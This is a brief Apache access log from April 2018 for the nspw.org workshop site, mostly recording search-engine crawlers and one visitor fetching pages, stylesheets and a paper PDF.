66.249.73.87 - - [28/Apr/2018:16:20:20 -0400] "GET /modules/field/theme/field.css?p7kfx6 HTTP/1.1" 200 599 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:20:20 -0400] "GET /themes/garland/print.css?p7kfx6 HTTP/1.1" 200 771 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:20:21 -0400] "GET /modules/node/node.css?p7kfx6 HTTP/1.1" 200 472 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [28/Apr/2018:16:20:21 -0400] "GET /themes/garland/style.css?p7kfx6 HTTP/1.1" 200 5370 "https://www.nspw.org/proceedings/2004" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.209.235.174 - - [28/Apr/2018:16:20:27 -0400] "GET /2003/ HTTP/1.1" 200 5320 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
207.46.13.52 - - [28/Apr/2018:16:20:21 -0400] "GET /papers/2008/nspw2008-mannan.pdf HTTP/1.1" 200 387785 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.87 - - [28/Apr/2018:16:20:40 -0400] "GET /2003/index.html HTTP/1.1" 404 8002 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [28/Apr/2018:16:21:06 -0400] "GET /current/ HTTP/1.1" 200 6904 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
139.59.158.182 - - [28/Apr/2018:16:21:17 -0400] "GET / HTTP/1.1" 200 6399 "http://www.nspw.org/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36"
139.59.158.182 - - [28/Apr/2018:16:21:18 -0400] "GET /nspw.org HTTP/1.1" 404 8006 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
139.59.158.182 - - [28/Apr/2018:16:21:18 -0400] "GET /2018/dates HTTP/1.1" 200 11231 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
139.59.158.182 - - [28/Apr/2018:16:21:18 -0400] "GET /2018 HTTP/1.1" 200 12401 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
